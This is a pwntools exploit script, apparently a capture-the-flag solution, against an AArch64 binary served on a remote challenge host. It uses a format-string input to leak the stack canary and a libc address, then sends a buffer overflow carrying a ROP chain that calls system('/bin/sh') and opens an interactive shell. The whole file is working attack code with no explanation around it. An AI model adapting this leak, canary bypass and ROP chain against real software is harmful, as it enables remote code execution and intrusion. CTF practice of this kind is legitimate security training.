from pwn import *

context.terminal = ['tmux', 'split-window', '-h']

elf = context.binary = ELF('chalarm')
libc = ELF('libc.so.6')
ld = ELF('ld-linux-aarch64.so.1')

#p = process('qemu-aarch64 -g 1234 chal'.split())

#p = process('qemu-aarch64 chal'.split())

p = remote('arm-and-a-leg.gold.b01le.rs', 1337)


p.sendlineafter(b'2. Legs\n', b'1')
p.sendlineafter(b'of?\n', b'1337')
# These are leaks for chal with pie
p.sendlineafter(b'appendage? ', b'%21$p%19$p')
# the below was for chal with pie
#p.sendlineafter(b'appendage? ', b'%23$p%21$p%19$p')
p.recv()
leaks = p.recv().split(b'0x')
# libc_start_main + 152 is at the 21st offset MAKE SURE TO SUBTRACT 152 FROM THE LEAK
libc_start_main_leak = leaks[1] 
libc_start_main = int(libc_start_main_leak, 16) - 152

# Canary at 19th offset
canaryleak = leaks[2].split(b'\n')[0]
canary = int(canaryleak, 16)

libc.address = libc_start_main - libc.symbols['__libc_start_main']

ldr_x19 = 0x00000000004008f4
binsh = libc.search(b'/bin/sh').__next__()
mov_x2_sp = 0x0000000000400910
ldr_x0_x2 = 0x000000000040091c
payload = flat([
    'a' * 104,
    canary,
    'b' * 8,
    mov_x2_sp,
    'c' * 8,
    canary,
    'd' * 8,
    ldr_x19,
    binsh,
    ldr_x0_x2,
    'e' * 24,
    libc.symbols['system']

])

#p.sendlineafter(b'feedback?!', payload)
p.sendline(payload)
p.interactive()
